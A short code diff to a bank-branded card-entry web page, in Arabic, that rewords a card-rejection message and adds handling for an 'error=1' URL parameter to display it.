@@ -752,7 +752,7 @@
             <line x1="6" y1="6" x2="18" y2="18"></line>
           </svg>
         </div>
-        <div class="modal-text">المعلومات التي تم ادخالها غير صحيحه يرجى التحقق من المعلومات الصحيحه واعاده المحاوله</div>
+        <div class="modal-text">تم رفض بيانات البطاقة. يرجى مراجعة المعلومات المدخلة والمحاولة مرة أخرى.</div>
         <button class="modal-btn" onclick="closeRejectModal()">إعادة المحاولة</button>
       </div>
     </div>
@@ -1066,6 +1066,13 @@
     var params = new URLSearchParams(window.location.search);
     if (params.get('error') === 'payment') {
       showInvalidFields(['cardNumber']);
+    }
+
+    if (params.get('error') === '1') {
+      var errorMsg = document.getElementById('errorMsg');
+      errorMsg.textContent = 'تم رفض بيانات البطاقة. يرجى مراجعة المعلومات المدخلة والمحاولة مرة أخرى.';
+      errorMsg.style.color = '#c0392b';
+      errorMsg.classList.add('active');
     }
 
     var sessionId = sessionStorage.getItem('aman_bank_session_id');
